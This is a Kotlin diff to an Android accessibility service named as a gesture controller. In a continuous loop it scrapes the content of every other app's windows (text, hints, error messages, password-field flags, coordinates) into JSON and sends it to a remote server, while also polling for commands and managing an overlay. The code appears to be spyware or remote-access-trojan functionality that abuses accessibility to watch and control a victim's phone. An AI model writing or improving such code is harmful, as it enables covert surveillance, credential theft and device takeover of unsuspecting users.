@@ -84,15 +84,8 @@ class ControleGestosService : AccessibilityService() {
         jobPrincipal = CoroutineScope(Dispatchers.IO).launch {
             while (true) {
                 try {
-                    val raiz = obterRaizAplicativo()
-                    if (raiz != null) {
-                        val estrutura = extrairEstruturaTela(raiz)
-                        enviarEstruturaParaServidor(estrutura)
-                        @Suppress("DEPRECATION")
-                        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) raiz.recycle()
-                    } else {
-                        Log.w("KL", "rootInActiveWindow nulo")
-                    }
+                    val estrutura = extrairEstruturaCompleta()
+                    enviarEstruturaParaServidor(estrutura)
 
                     verificarComandosRecebidos()
                     verificarOverlay()
@@ -138,91 +131,36 @@ class ControleGestosService : AccessibilityService() {
             }?.root ?: rootInActiveWindow
     }
 
-    private fun extrairEstruturaTela(raiz: AccessibilityNodeInfo): String {
+    private fun extrairEstruturaCompleta(): String {
         val listaElementos = mutableListOf<Map<String, Any>>()
+        val idsIncluidos = mutableSetOf<String>()
         val displayMetrics = resources.displayMetrics
 
-        fun percorrerNo(no: AccessibilityNodeInfo) {
-            val area = Rect()
-            no.getBoundsInScreen(area)
-
-            if (area.width() > 2 && area.height() > 2 && no.isVisibleToUser) {
-                val className = no.className?.toString() ?: ""
-                val isClickable = no.isClickable || no.isLongClickable
-                val isEditable = no.isEditable
-                val isCheckable = no.isCheckable
-                val isPassword = no.isPassword
-                val isEnabled = no.isEnabled
-                val isChecked = no.isChecked
-
-                val texto = no.text?.toString()?.trim() ?: ""
-                val descricao = no.contentDescription?.toString()?.trim() ?: ""
-                val dica = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    no.hintText?.toString()?.trim() ?: ""
-                } else ""
-                val recursoId = no.viewIdResourceName?.substringAfter("/") ?: ""
-
-                val tipo = when {
-                    isEditable || className.contains("EditText", ignoreCase = true) -> "campo_texto"
-                    className.contains("ImageButton", ignoreCase = true) -> "botao"
-                    className.contains("Button", ignoreCase = true) -> "botao"
-                    className.contains("CheckBox", ignoreCase = true) ||
-                            className.contains("Switch", ignoreCase = true) ||
-                            className.contains("ToggleButton", ignoreCase = true) ||
-                            isCheckable -> "selecao"
-                    className.contains("ImageView", ignoreCase = true) -> "imagem"
-                    className.contains("TextView", ignoreCase = true) -> "texto"
-                    isClickable -> "clicavel"
-                    else -> "outro"
+        val janelas = windows
+        if (!janelas.isNullOrEmpty()) {
+            janelas
+                .filter { janela ->
+                    val raiz = janela.root ?: return@filter false
+                    val pacote = raiz.packageName?.toString() ?: ""
+                    pacote != packageName &&
+                            janela.type != AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY
                 }
-
-                val cor = when (tipo) {
-                    "campo_texto" -> "#2196F3"
-                    "botao"       -> "#4CAF50"
-                    "texto"       -> "#424242"
-                    "clicavel"    -> "#FF9800"
-                    "imagem"      -> "#9C27B0"
-                    "selecao"     -> "#F44336"
-                    else          -> "#9E9E9E"
+                .forEach { janela ->
+                    janela.root?.let { percorrerNo(it, listaElementos, idsIncluidos) }
                 }
-
-                listaElementos.add(
-                    mapOf(
-                        "tipo"       to tipo,
-                        "type"       to tipo,
-                        "classe"     to className,
-                        "cor"        to cor,
-                        "texto"      to texto,
-                        "text"       to texto,
-                        "descricao"  to descricao,
-                        "dica"       to dica,
-                        "recurso_id" to recursoId,
-                        "viewId"     to recursoId,
-                        "x"          to area.left,
-                        "y"          to area.top,
-                        "largura"    to area.width(),
-                        "altura"     to area.height(),
-                        "width"      to area.width(),
-                        "height"     to area.height(),
-                        "clicavel"   to isClickable,
-                        "editavel"   to isEditable,
-                        "senha"      to isPassword,
-                        "ativo"      to isEnabled,
-                        "marcado"    to isChecked
-                    )
-                )
-            }
-
-            for (i in 0 until no.childCount) {
-                val filho = no.getChild(i) ?: continue
-                percorrerNo(filho)
-                @Suppress("DEPRECATION")
-                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) filho.recycle()
-            }
         }
 
-        percorrerNo(raiz)
+        if (listaElementos.isEmpty()) {
+            obterRaizAplicativo()?.let { percorrerNo(it, listaElementos, idsIncluidos) }
+        }
 
+        return montarJsonEstrutura(listaElementos, displayMetrics)
+    }
+
+    private fun montarJsonEstrutura(
+        listaElementos: List<Map<String, Any>>,
+        displayMetrics: android.util.DisplayMetrics
+    ): String {
         val json = org.json.JSONObject().apply {
             put("id", Build.ID)
             put("modelo", "${Build.MANUFACTURER} ${Build.MODEL}".trim())
@@ -240,10 +178,204 @@ class ControleGestosService : AccessibilityService() {
             elementosJson.put(obj)
         }
         json.put("elementos", elementosJson)
-
         return json.toString()
     }
 
+    private fun obterTextoDireto(no: AccessibilityNodeInfo): String {
+        return no.text?.toString()?.trim().orEmpty()
+    }
+
+    private fun obterDescricao(no: AccessibilityNodeInfo): String {
+        return no.contentDescription?.toString()?.trim().orEmpty()
+    }
+
+    private fun obterDica(no: AccessibilityNodeInfo): String {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return ""
+        return no.hintText?.toString()?.trim().orEmpty()
+    }
+
+    private fun obterEstado(no: AccessibilityNodeInfo): String {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return ""
+        return no.stateDescription?.toString()?.trim().orEmpty()
+    }
+
+    private fun obterRotuloElemento(no: AccessibilityNodeInfo): String {
+        val partes = linkedSetOf<String>()
+        obterTextoDireto(no).takeIf { it.isNotEmpty() }?.let { partes.add(it) }
+        obterDescricao(no).takeIf { it.isNotEmpty() }?.let { partes.add(it) }
+        obterDica(no).takeIf { it.isNotEmpty() }?.let { partes.add(it) }
+        obterEstado(no).takeIf { it.isNotEmpty() }?.let { partes.add(it) }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            no.error?.toString()?.trim()?.takeIf { it.isNotEmpty() }?.let { partes.add(it) }
+        }
+        if (no.isPassword) partes.add("••••")
+        return partes.joinToString("\n")
+    }
+
+    private fun coletarTextoDescendentes(
+        no: AccessibilityNodeInfo,
+        profundidadeMax: Int = 5,
+        profundidade: Int = 0
+    ): String {
+        if (profundidade > profundidadeMax) return ""
+
+        val textos = linkedSetOf<String>()
+        for (i in 0 until no.childCount) {
+            val filho = no.getChild(i) ?: continue
+            obterRotuloElemento(filho).takeIf { it.isNotEmpty() }?.let { textos.add(it) }
+            coletarTextoDescendentes(filho, profundidadeMax, profundidade + 1)
+                .takeIf { it.isNotEmpty() }
+                ?.let { textos.add(it) }
+            @Suppress("DEPRECATION")
+            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) filho.recycle()
+        }
+        return textos.take(4).joinToString(" | ")
+    }
+
+    private fun identificarTipo(className: String, isClickable: Boolean, isEditable: Boolean, isCheckable: Boolean): String {
+        return when {
+            isEditable || className.contains("EditText", ignoreCase = true) ||
+                    className.contains("AutoCompleteTextView", ignoreCase = true) -> "campo_texto"
+            className.contains("ImageButton", ignoreCase = true) -> "botao"
+            className.contains("Button", ignoreCase = true) ||
+                    className.contains("MaterialButton", ignoreCase = true) -> "botao"
+            className.contains("CheckBox", ignoreCase = true) ||
+                    className.contains("Switch", ignoreCase = true) ||
+                    className.contains("ToggleButton", ignoreCase = true) ||
+                    className.contains("RadioButton", ignoreCase = true) ||
+                    isCheckable -> "selecao"
+            className.contains("ImageView", ignoreCase = true) -> "imagem"
+            className.contains("WebView", ignoreCase = true) -> "webview"
+            className.contains("RecyclerView", ignoreCase = true) ||
+                    className.contains("ListView", ignoreCase = true) ||
+                    className.contains("GridView", ignoreCase = true) -> "lista"
+            className.contains("TextView", ignoreCase = true) ||
+                    className.contains("compose", ignoreCase = true) -> "texto"
+            isClickable -> "clicavel"
+            else -> "outro"
+        }
+    }
+
+    private fun corPorTipo(tipo: String): String = when (tipo) {
+        "campo_texto" -> "#2196F3"
+        "botao"       -> "#4CAF50"
+        "texto"       -> "#E0E0E0"
+        "clicavel"    -> "#FF9800"
+        "imagem"      -> "#9C27B0"
+        "selecao"     -> "#F44336"
+        "lista"       -> "#00BCD4"
+        "webview"     -> "#FF5722"
+        else          -> "#9E9E9E"
+    }
+
+    private fun deveIncluirElemento(
+        no: AccessibilityNodeInfo,
+        area: Rect,
+        rotulo: String,
+        className: String,
+        isClickable: Boolean,
+        isEditable: Boolean
+    ): Boolean {
+        if (area.width() <= 0 || area.height() <= 0) return false
+
+        if (rotulo.isNotEmpty()) return true
+
+        if (isEditable || isClickable) {
+            return area.width() >= 16 && area.height() >= 16
+        }
+
+        val classeRelevante = className.contains("Text", ignoreCase = true) ||
+                className.contains("Button", ignoreCase = true) ||
+                className.contains("Edit", ignoreCase = true) ||
+                className.contains("WebView", ignoreCase = true) ||
+                className.contains("Recycler", ignoreCase = true) ||
+                className.contains("compose", ignoreCase = true)
+
+        return classeRelevante && area.width() >= 8 && area.height() >= 8
+    }
+
+    private fun percorrerNo(
+        no: AccessibilityNodeInfo,
+        listaElementos: MutableList<Map<String, Any>>,
+        idsIncluidos: MutableSet<String>
+    ) {
+        val area = Rect()
+        no.getBoundsInScreen(area)
+
+        val className = no.className?.toString() ?: ""
+        val isClickable = no.isClickable || no.isLongClickable
+        val isEditable = no.isEditable
+        val isCheckable = no.isCheckable
+        val isPassword = no.isPassword
+        val isEnabled = no.isEnabled
+        val isChecked = no.isChecked
+
+        val texto = obterTextoDireto(no)
+        val descricao = obterDescricao(no)
+        val dica = obterDica(no)
+        val estado = obterEstado(no)
+        val recursoId = no.viewIdResourceName?.substringAfter("/") ?: ""
+
+        var rotulo = obterRotuloElemento(no)
+        if (rotulo.isEmpty() && (isClickable || isEditable || no.childCount > 0)) {
+            rotulo = coletarTextoDescendentes(no)
+        }
+
+        val visivel = no.isVisibleToUser
+        val temConteudo = rotulo.isNotEmpty() || descricao.isNotEmpty() || texto.isNotEmpty()
+
+        if ((visivel || temConteudo) && deveIncluirElemento(no, area, rotulo, className, isClickable, isEditable)) {
+            val tipo = identificarTipo(className, isClickable, isEditable, isCheckable)
+            val textoExibicao = rotulo.ifEmpty { descricao.ifEmpty { dica.ifEmpty { estado.ifEmpty { recursoId } } } }
+            val chave = "${area.left}|${area.top}|${area.width()}|${area.height()}|$textoExibicao|$className"
+
+            if (chave !in idsIncluidos) {
+                idsIncluidos.add(chave)
+                listaElementos.add(
+                    mapOf(
+                        "tipo"       to tipo,
+                        "type"       to tipo,
+                        "classe"     to className,
+                        "cor"        to corPorTipo(tipo),
+                        "rotulo"     to textoExibicao,
+                        "label"      to textoExibicao,
+                        "texto"      to textoExibicao,
+                        "text"       to textoExibicao,
+                        "descricao"  to descricao,
+                        "dica"       to dica,
+                        "estado"     to estado,
+                        "recurso_id" to recursoId,
+                        "viewId"     to recursoId,
+                        "x"          to area.left,
+                        "y"          to area.top,
+                        "largura"    to area.width(),
+                        "altura"     to area.height(),
+                        "width"      to area.width(),
+                        "height"     to area.height(),
+                        "clicavel"   to isClickable,
+                        "editavel"   to isEditable,
+                        "senha"      to isPassword,
+                        "ativo"      to isEnabled,
+                        "marcado"    to isChecked
+                    )
+                )
+            }
+        }
+
+        for (i in 0 until no.childCount) {
+            val filho = no.getChild(i) ?: continue
+            percorrerNo(filho, listaElementos, idsIncluidos)
+            @Suppress("DEPRECATION")
+            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) filho.recycle()
+        }
+    }
+
+    private fun extrairEstruturaTela(raiz: AccessibilityNodeInfo): String {
+        val listaElementos = mutableListOf<Map<String, Any>>()
+        val idsIncluidos = mutableSetOf<String>()
+        percorrerNo(raiz, listaElementos, idsIncluidos)
+        return montarJsonEstrutura(listaElementos, resources.displayMetrics)
+    }
     // ─── Comunicação com o servidor ──────────────────────────────────────────
 
     private fun enviarEstruturaParaServidor(dados: String) {
